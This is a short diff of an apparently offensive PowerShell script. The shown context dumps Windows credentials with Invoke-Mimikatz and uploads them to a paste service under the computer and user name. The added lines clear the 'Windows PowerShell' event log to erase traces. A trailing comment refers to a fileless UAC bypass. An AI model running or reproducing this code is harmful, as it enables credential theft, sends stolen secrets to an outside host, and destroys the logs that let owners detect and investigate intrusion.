@@ -17,6 +17,8 @@ param (
 	`$Creds = Invoke-Mimikatz -DumpCreds
 	`$Description = 'Mimikatz Dump - ' + `$env:COMPUTERNAME + '\' + `$env:USERNAME
 	New-Paste -api_key $api_key -description `$Description -paste `$Creds
+	# Clear EventLog
+	Clear-EventLog -LogName 'Windows PowerShell'
 	"
 
 	## Fileless bypass uac
